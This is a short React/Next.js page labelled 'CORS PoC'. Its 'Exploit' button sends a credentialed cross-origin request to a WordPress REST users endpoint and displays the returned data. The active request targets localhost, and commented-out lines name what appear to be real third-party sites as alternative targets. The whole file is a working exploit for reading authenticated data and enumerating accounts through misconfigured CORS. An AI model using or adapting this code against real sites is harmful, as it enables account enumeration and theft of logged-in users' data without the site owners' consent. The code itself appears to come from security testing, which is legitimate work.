'use client'
import { useState } from "react";

const page = () => {

    const [response, setResponse] = useState('');

    const cors = () => {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                alert(this.responseText);
                setResponse(this.responseText);
            }
        };
        //xhr.open("GET", "http://localhost:8888/OPUC/wp-json/contact-form-7/v1/contact-forms/139/feedback/schema", true);

        xhr.open("GET", "http://localhost:8888/OPUC/wp-json/wp/v2/users/", true);
        //xhr.open("GET", "https://www.oshawapower.ca/wp-json/wp/v2/users/", true);
        //xhr.open("GET", "https://csa.local.storeabl.tech/wp-json/wp/v2/pages/1600861", true);
        xhr.withCredentials = true;
        xhr.send();
    };
    
  return (
    <div>
        <h2>CORS PoC</h2>
        <div id="demo">
            <button type="button" onClick={cors}>Exploit</button>
        </div>
        {response && <div>{response}</div>}
   </div>
  )
};

export default page
